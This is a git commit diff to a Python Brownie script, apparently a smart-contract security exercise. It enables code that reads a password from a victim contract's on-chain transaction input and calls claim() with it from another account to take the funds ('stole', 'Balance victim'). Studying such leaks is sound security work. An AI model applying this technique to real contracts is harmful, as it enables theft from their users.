8e2eb4f76290897a5efc2176057b6b39309c3fbc
Juan Cruz Saldaño <70445613+fowardelcac@users.noreply.github.com>
2022-03-28 12:52:27 -0300

    Update deploy.py

--- deploy.py
+++ deploy.py
@@ -13,10 +13,10 @@ def main():
     c, tx = securityBank()
     # Suponiendo q obutve el hash de la tx de la cadena de blocques
     #trasnacttion = chain.get_transaction('0x7c62af664abf32c8187344d15ff809a447a53f197934c4e9e7f6e00558ed9840')
-    '''transaction_data = c.decode_input(tx.input)
+    transaction_data = c.decode_input(tx.input)
     password = transaction_data[1]
     stole = c.claim(password[0], {'from': accounts[9]})
     stole.wait(1)
+    print(stole.info())
     print("Balance victim:", c.balance())
-    numero = web3.eth.get_storage_at(c.address, 0)
-    print(web3.toInt(numero))'''
+    
